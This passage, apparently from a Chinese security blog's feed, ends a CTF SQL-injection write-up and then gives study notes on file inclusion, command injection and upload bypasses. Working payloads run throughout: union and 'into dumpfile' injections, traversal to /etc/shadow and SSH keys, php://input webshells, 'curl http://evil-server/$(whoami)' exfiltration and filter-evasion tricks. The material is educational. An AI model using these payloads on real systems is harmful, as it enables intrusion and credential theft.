class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6000000</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$url</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>代码思路是输入c并转换为整数，利用switch判断并执行相应语句，但case3并没有break，可以利用case3得到case6000000的url</p><p><img src="1.png"></p><p>进入此url后需要进行sql注入，如下为过滤条件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;</span>, $_GET[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">die(<span class="string">&#x27;@A@&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到过滤并不全面，过滤了<code>information_schema.tables</code>可以用反引号绕过。注入流程如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?query<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>database() # 爆库名</span><br><span class="line">?query<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.`tables`<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span>database() # 爆表名</span><br><span class="line">?query<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.`columns`<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;content&#x27;</span> # 爆列名</span><br><span class="line">?query<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(id,username,password)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>content # 爆值</span><br></pre></td></tr></table></figure><p>获得提示内容如下</p><p><img src="2.png" alt="2"></p><p>根据提示查看<code>secret.php</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>load_file(<span class="string">&#x27;/var/www/html/secret.php&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;here_1s_your_f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/tmp/gtf1y&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(trim(@file_get_contents(<span class="variable">$file</span>)) === <span class="string">&#x27;ctf.show&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/real_flag_is_here&#x27;</span>);</span><br><span class="line">&#125;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure><p>代码逻辑是只要向<code>/tmp/gtf1y</code>中写入<code>ctf.show</code>即可得到flag，当然也可以直接读取<code>/real_flag_is_here</code>。这里练习一下使用<code>select into outfile</code>来写入内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query<span class="operator">=</span><span class="number">53</span><span class="comment">/**/</span><span class="keyword">union</span> <span class="keyword">select</span> &quot;ctf.show&quot; <span class="keyword">into</span> dumpfile &quot;/tmp/gtf1y&quot;</span><br></pre></td></tr></table></figure><p>访问包含了<code>secret.php</code>的首页面，即可得到flag</p><p><img src="3.png" alt="3"></p>]]></content>
      
      
      <categories>
          
          <category> 值得一写的刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
            <tag> writeup </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件读取与文件包含漏洞的利用和绕过</title>
      <link href="/2021/08/04/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/"/>
      <url>/2021/08/04/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="常见敏感文件"><a href="#常见敏感文件" class="headerlink" title="常见敏感文件"></a>常见敏感文件</h1><h2 id="应用的配置文件"><a href="#应用的配置文件" class="headerlink" title="应用的配置文件"></a>应用的配置文件</h2><ul><li><code>/etc/apache2/apache2.conf</code></li><li><code>/etc/nginx/nginx.conf</code></li></ul><h2 id="应用的日志文件（注入一句话木马）"><a href="#应用的日志文件（注入一句话木马）" class="headerlink" title="应用的日志文件（注入一句话木马）"></a>应用的日志文件（注入一句话木马）</h2><ul><li><code>/var/log/apache2/access.log</code></li><li><code>/var/log/nginx/access.log</code></li></ul><h2 id="站点目录下的敏感文件"><a href="#站点目录下的敏感文件" class="headerlink" title="站点目录下的敏感文件"></a>站点目录下的敏感文件</h2><ul><li><code>.svn/entries</code></li><li><code>.git/HEAD</code></li><li><code>WEB-INF/web.xml</code></li><li><code>.htaccess</code></li></ul><h2 id="特殊的备份文件"><a href="#特殊的备份文件" class="headerlink" title="特殊的备份文件"></a>特殊的备份文件</h2><ul><li><code>.swp</code></li><li><code>.swo</code></li><li><code>.bak</code></li><li><code>index.php~</code></li></ul><h2 id="Python-的-Cache"><a href="#Python-的-Cache" class="headerlink" title="Python 的 Cache"></a>Python 的 Cache</h2><ul><li><code>__pycache__\__init__.cpython-35.pyc</code></li></ul><h2 id="操作系统的敏感文件"><a href="#操作系统的敏感文件" class="headerlink" title="操作系统的敏感文件"></a>操作系统的敏感文件</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li><code>C:\boot.ini （查看系统版本）</code></li><li><code>C:\Windows\System32\inetsrv\MetaBase.xml （iis配置文件）</code></li><li><code>C:\Windows\repair\sam （存储系统初次安装的密码）</code></li><li><code>C:\Program Files\mysql\my.ini （Mysql配置）</code></li><li><code>C:\Program Files\mysql\data\mysql\user.MYD （Mysql root）</code></li><li><code>C:\Windows\php.ini （php配置信息）</code></li><li><code>C:\Windows\my.ini （Mysql配置信息）</code></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li><code>/root/.ssh/authorized_keys</code></li><li><code>/root/.ssh/id_rsa</code></li><li><code>/root/.ssh/id_rsa.keystore</code></li><li><code>/root/.ssh/known_hosts</code></li><li><code>/etc/passwd （主机账号文件）</code></li><li><code>/etc/shadow （主机密码文件）</code></li><li><code>/etc/my.cnf （Mysql配置文件）</code></li><li><code>/etc/httpd/conf/httpd.conf （apache配置文件）</code></li><li><code>/root/.bash_history （root操作命令历史记录）</code></li><li><code>/root/.mysql_history （mysql命令历史记录）</code></li><li><code>/proc/self/fd/fd[0-9]*(文件标识符)</code></li><li><code>/proc/mounts</code></li><li><code>/proc/config.gz</code></li></ul><h1 id="常见的文件包含函数"><a href="#常见的文件包含函数" class="headerlink" title="常见的文件包含函数"></a>常见的文件包含函数</h1><ul><li><p><code>include()</code>：包含并运行指定文件，在出错时产生警告(E_WARNING)，一般会继续运行。</p></li><li><p><code>include_once()</code>：会检查指定文件是否被包含过，如果是则不会再次包含。</p></li><li><p><code>require()</code>：包含并运行指定文件，在出错时产生错误(E_COMPLE_ERROR)，脚本中止运行</p></li><li><p><code>require_once()</code>：会检查指定文件是否被包含过，如果是则不会再次包含。</p></li></ul><h1 id="常用文件包含方式"><a href="#常用文件包含方式" class="headerlink" title="常用文件包含方式"></a>常用文件包含方式</h1><ul><li>同目录包含 <code>?file=.htaccess</code></li><li>目录遍历 <code>?file=../../../../../../../../../var/lib/locate.db</code></li><li>日志注入 <code>?file=../../../../../../../../../var/log/nginx/access.log</code></li><li>利用 <code>/proc/self/environ</code></li><li>利用伪协议</li></ul><h1 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h1><h2 id="url-编码绕过"><a href="#url-编码绕过" class="headerlink" title="url 编码绕过"></a>url 编码绕过</h2><p>如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式绕过</p><h2 id="特殊字符绕过（待理解）"><a href="#特殊字符绕过（待理解）" class="headerlink" title="特殊字符绕过（待理解）"></a>特殊字符绕过（待理解）</h2><ul><li>某些情况下，读文件支持使用 Shell 通配符，如 <code>? *</code> 等</li><li>url 中使用 <code>? #</code> 可能会影响 include 包含的结果</li><li>某些情况下，unicode 编码不同但是字形相近的字符有同一个效果</li></ul><h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><code>%00</code>截断</h2><p>几乎是最常用的方法，条件是 <code>magic_quotes_gpc=Off</code>，而且 php 版本小于 5.3.4</p><h2 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h2><p>Windows 上的文件名长度和文件路径有关，具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes</p><p>msdn定义 <code>#define MAX_PATH 260</code>，其中第 260 个字符为字符串结尾的 <code>\0</code>，而Linux可以用 <code>getconf</code>来判断文件名长度限制和文件路径长度限制</p><ul><li>获取最长文件路径长度：<code>getconf PATH_MAX /root</code> 得到 4096 </li><li>获取最长文件名：<code>getconf NAME_MAX /root</code> 得到 255</li></ul><p>在长度有限的时候，<code>././././ (n 个)</code> 的形式就可以通过这个把路径爆破掉</p><p>在 php 代码包含中，这种绕过方式要求 php 版本 &lt; php 5.2.8</p><h2 id="伪协议绕过"><a href="#伪协议绕过" class="headerlink" title="伪协议绕过"></a>伪协议绕过</h2><ul><li><p>远程包含</p><p>要求<code>allow_url_fopen=On</code>且<code>allow_url_include=On</code></p><p>payload形式为<code>?file=[http|https|ftp]://websec.wordpress.com/shell.txt</code></p></li><li><p><code>php://input</code></p><p>要求 <code>allow_url_include=On</code></p><p>payload形式为<code>?file=php://input</code>并在body中写入一句话木马</p><p><strong>为避免出错，推荐使用burp</strong></p></li><li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code></p><p>payload形式为<code>?file=php://filter/convert.base64-encode/resource=index.php</code></p></li><li><p><code>data://text/plain;base64,</code></p><p>要求<code>allow_url_include=On</code></p><p>payload形式为<code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p></li></ul><h2 id="协议绕过（待理解）"><a href="#协议绕过（待理解）" class="headerlink" title="协议绕过（待理解）"></a>协议绕过（待理解）</h2><p>allow_url_fopen 和 allow_url_include 主要是针对 http ftp 两种协议起作用，因此可以使用 SMB、WebDav 协议等方式来绕过限制</p>]]></content>
      
      
      <categories>
          
          <category> Web-基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令注入漏洞的利用和绕过</title>
      <link href="/2021/08/03/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/"/>
      <url>/2021/08/03/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="常见可利用函数"><a href="#常见可利用函数" class="headerlink" title="常见可利用函数"></a>常见可利用函数</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ul><li><code>system</code>: 将字符串作为os命令执行，自带输出功能</li><li><code>passthru</code>: 与<code>system()</code>功能相似</li><li><code>exec</code>: 将字符串作为os命令执行，需要输出执行结果</li><li><code>shell_exec</code>: 与<code>exec()</code>功能相似</li><li><code>popen</code>: 命令执行结果会返回一个文件指针，需要将查询结果导入文件中再进行查看</li><li><code>proc_open</code>: 与<code>popen()</code>功能相似， 但是提供了更加强大的控制程序执行的能力</li></ul><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><ul><li><code>system</code></li><li><code>popen</code></li><li><code>subprocess.call</code></li><li><code>spawn</code></li></ul><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><ul><li><code>java.lang.Runtime.getRuntime().exec()</code></li></ul><h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><h2 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h2><ul><li><code>||</code> <code>&amp;&amp;</code> <code>&amp;</code> 分割</li><li><code>|</code> 管道符</li></ul><h2 id="Unix类系统"><a href="#Unix类系统" class="headerlink" title="Unix类系统"></a>Unix类系统</h2><ul><li><code>;</code>分割</li><li><code>\r\n</code> <code>%d0%a0</code> 换行</li><li>反引号内的内容也会解析成os命令</li><li><code>$()</code> 替换</li></ul><h1 id="无回显场景的命令注入方式"><a href="#无回显场景的命令注入方式" class="headerlink" title="无回显场景的命令注入方式"></a>无回显场景的命令注入方式</h1><h2 id="基于延时检测"><a href="#基于延时检测" class="headerlink" title="基于延时检测"></a>基于延时检测</h2><p>使用能触发延时的注入命令，然后根据应用程序的响应时长来判断注入的命令是否被执行</p><p>使用 <code>ping</code> 命令是一种有效的方式，因为此命令允许指定要发送的 ICMP 包的数量以及命令运行的时间，这个命令将会持续ping 10秒钟：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ping -c 10 127.0.0.1 &amp;</span><br></pre></td></tr></table></figure><h2 id="重定向输出"><a href="#重定向输出" class="headerlink" title="重定向输出"></a>重定向输出</h2><p>可以将注入命令的输出重定向到能够使用浏览器访问到的 web 目录。例如，应用程序使用 <code>/var/www/static</code> 路径作为静态资源目录，那么可以提交以下输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; whoami &gt; /var/www/static/whoami.txt &amp;</span><br></pre></td></tr></table></figure><p>上面这个命令通过重定向符<code>&gt;</code>就是把 <code>whoami</code> 的执行结果输出到 <code>/var/www/static/whoami.txt</code>文件中，然后就可以通过浏览器访问 <code>https://vulnerable-website.com/whoami.txt</code> 查看命令的输出结果</p><h2 id="使用OAST-带外-技术"><a href="#使用OAST-带外-技术" class="headerlink" title="使用OAST 带外 技术"></a>使用OAST 带外 技术</h2><p>使用 OAST 带外技术要有一个自己控制的外部系统，然后注入命令执行，触发与所控制的系统的交互。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://evil-server/$(whoami)</span><br><span class="line">wget http://evil-server/$(whoami)</span><br></pre></td></tr></table></figure><h1 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h1><h2 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h2><ul><li><code>&lt;</code> 符号: <code>cat&lt;123</code></li><li><code>\t</code> 或 <code>%09</code></li><li><code>$&#123;IFS&#125;</code>: 其中<code>&#123;&#125;</code>用来截断，比如 <code>cat$IFS2 </code>会被认为 <code>IFS2</code> 是变量名。另外，在后面加个 <code>$</code>符号 可以起到截断的作用，一般用 <code>$9</code>，因为<code>$9</code>是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串</li></ul><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><ul><li>使用变量传递执行ls命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure><ul><li>使用base64编码执行ls命令 </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bHM=&quot;</span> | base64 -d</span><br></pre></td></tr></table></figure><ul><li>使用模糊路径执行<code>/bin/ls</code>命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="keyword">in</span>/?s</span><br></pre></td></tr></table></figure><ul><li>使用连接符执行 </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/pass<span class="string">&#x27;w&#x27;</span>d</span><br></pre></td></tr></table></figure><ul><li>使用未定义的初始化变量占位</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat<span class="variable">$x</span> /etc/passwd</span><br></pre></td></tr></table></figure><h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure><p>上面的方法为通过命令行重定向写入命令，接着通过<code>ls</code>按时间排序把命令写入文件，最后执行</p><p>直接在 Linux终端下执行的话, 创建文件需要在重定向符号之前添加命令这里可以使用一些诸如 <code>w</code>,<code>[</code>之类的短命令，(使用<code>ls /usr/bin/?</code> 查看) 如果不添加命令，需要 <code>Ctrl+D</code> 才能结束，这样就等于标准输入流的重定向</p><p>而在 php 中,使用 shell_exec() 等执行系统命令的函数的时候, 是不存在标准输入流的，所以可以直接创建文件</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>当你识别 OS 命令注入漏洞时，执行一些初始命令以获取有关系统信息通常很有用。下面是一些在 Linux 和 Windows 平台上常用命令的摘要：</p><table><thead><tr><th>命令含义</th><th>Linux</th><th>Windows</th></tr></thead><tbody><tr><td>显示当前用户名</td><td>whoami</td><td>whoami</td></tr><tr><td>显示操作系统信息</td><td>uname -a</td><td>ver</td></tr><tr><td>显示网络配置</td><td>ifconfig</td><td>ipconfig /all</td></tr><tr><td>显示网络连接</td><td>netstat -an</td><td>netstat -an</td></tr><tr><td>显示正在运行的进程</td><td>ps -ef</td><td>tasklist</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Web-基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程命令执行 </tag>
            
            <tag> 命令注入 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞的利用和绕过</title>
      <link href="/2021/08/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/"/>
      <url>/2021/08/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="常见上传漏洞及绕过方法"><a href="#常见上传漏洞及绕过方法" class="headerlink" title="常见上传漏洞及绕过方法"></a>常见上传漏洞及绕过方法</h1><h2 id="基于文件校验的漏洞"><a href="#基于文件校验的漏洞" class="headerlink" title="基于文件校验的漏洞"></a>基于文件校验的漏洞</h2><h3 id="绕过客户端javascript检测"><a href="#绕过客户端javascript检测" class="headerlink" title="绕过客户端javascript检测"></a>绕过客户端javascript检测</h3><p>前端一般会用JS函数来验证上传文件的扩展名，通过直接禁用JS代码，或者使用burp进行抓包改包，就可以绕过这类验证</p><h3 id="寻找可解析后缀绕过"><a href="#寻找可解析后缀绕过" class="headerlink" title="寻找可解析后缀绕过"></a>寻找可解析后缀绕过</h3><p>利用burp抓包HTTP请求，利用intruder模块进行枚举后缀名，来寻找黑名单中是否存在没有过滤到的后缀名。常见的可解析后缀名如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini</span></span><br></pre></td></tr></table></figure><h3 id="文件名大小写绕过"><a href="#文件名大小写绕过" class="headerlink" title="文件名大小写绕过"></a>文件名大小写绕过</h3><p>用诸如 <code>AsP</code>，<code>pHp</code> 之类的文件名绕过黑名单检测</p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>针对不是循环替换后缀名为空的情况，通过诸如<code>pphphp</code>来绕过</p><h3 id="特殊文件名绕过"><a href="#特殊文件名绕过" class="headerlink" title="特殊文件名绕过"></a>特殊文件名绕过</h3><p>windows系统下，利用burp抓包把文件名改成 <code>test.php.</code>或 <code>test.php_ </code>（下划线代表空格），这种命名方式在 windows 系统里是不被允许的，所以需要在 burp 里进行修改，绕过验证后，会被 windows 系统自动去掉后面的点和空格</p><h3 id="htaccess文件绕过"><a href="#htaccess文件绕过" class="headerlink" title=".htaccess文件绕过"></a><code>.htaccess</code>文件绕过</h3><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。在apache中，如果需要启动<code>.htaccess</code>，必须在<code>http.conf</code>中设置<code>AllowOverride</code>为<code>All</code></p><p>如果上传一个<code>.htaccess</code>，其内容如下，则所有文件都会被解析为php：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><h3 id="usr-ini文件绕过"><a href="#usr-ini文件绕过" class="headerlink" title=".usr.ini文件绕过"></a><code>.usr.ini</code>文件绕过</h3><p>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.usr.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。在.usr.ini中输入以下内容，这样在该目录下的所有文件都会包含a.txt的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file =a.txt</span><br></pre></td></tr></table></figure><h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a><code>::$DATA</code>绕过</h3><p><code>::$DATA</code>是Windows下NTFS文件系统的一个特性，使用burp抓包并在后缀名中添加<code>::$DATA</code>即可绕过</p><h3 id="可控路径绕过"><a href="#可控路径绕过" class="headerlink" title="可控路径绕过"></a>可控路径绕过</h3><p>若文件存储的路径可控，则可以通过构造存储路径的方式改变所上传文件的后缀名，从而达到绕过的目的</p><h3 id="写入方法"><a href="#写入方法" class="headerlink" title="写入方法"></a>写入方法</h3><p>首先上传文件名为<code>1.php:jpg</code>，会写入一个<code>1.php</code>的空文件，然后再上传一个文件，然后修改名字为<code>2.&lt;&lt;&lt;</code>，这样就会把这个文件的内容写入到<code>1.php</code>文件中</p><h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><p>检查<code>Content-type</code>，burp抓包修改其类型为服务器允许接收的类型即可绕过</p><p><code>Content-type</code>常见类型如下：</p><table><thead><tr><th>文件类型</th><th>Content-type</th></tr></thead><tbody><tr><td>超文本标记语言文本</td><td>.html,.html text/html</td></tr><tr><td>普通文本</td><td>.txt text/plain</td></tr><tr><td>RTF文本</td><td>.txt text/plain</td></tr><tr><td>GIF图形</td><td>.gif image/gif</td></tr><tr><td>JPEG图形</td><td>.jpeg,.jpg image/jpeg</td></tr><tr><td>au声音文件</td><td>.au audio/basic</td></tr><tr><td>MIDI音乐文件</td><td>.mid,.midi audio/midi,audio/x-midi</td></tr><tr><td>RealAudio音乐文件</td><td>.ra, .ram audio/x-pn-realaudio</td></tr><tr><td>MPEG文件</td><td>.mpg,.mpeg video/mpeg</td></tr><tr><td>AVI文件</td><td>.avi video/x-msvideo</td></tr><tr><td>GZIP文件</td><td>.gz application/x-gzip</td></tr><tr><td>TAR文件</td><td>.tar application/x-tar</td></tr></tbody></table><h3 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a><code>%00</code>截断绕过</h3><p><code>%00</code>截断是很常见的截断方法，原理是有些函数处理时，会把这个字符当作结束符</p><p><strong>利用条件</strong>：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</p><ul><li><p>GET型00截断中，我们要使用<code>%00</code>来截断，因为GET型提交的内容会被自动进行URL解码。</p></li><li><p>POST型00截断，<code>%00</code>是不会被自动解码的，可以利用burp对post消息体进行url解码，将其解码为空字符</p></li></ul><h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>文件头是用来唯一标识文件类型的一系列数字（十六进制），当限制了文件头时，就要给的文件制造可以绕过检测的文件头：</p><table><thead><tr><th align="center">扩展名</th><th align="center">文件头</th><th align="center">文件尾</th></tr></thead><tbody><tr><td align="center">JPEG(jpg)</td><td align="center">FF D8 FF E1</td><td align="center"></td></tr><tr><td align="center">PNG(png)</td><td align="center">89 50 4E 47</td><td align="center">00 00 00 00 49 45 4E 44 AE 42 60 82</td></tr><tr><td align="center">GIF(gif)</td><td align="center">47 49 46 38</td><td align="center"></td></tr><tr><td align="center">TIFF(tif)</td><td 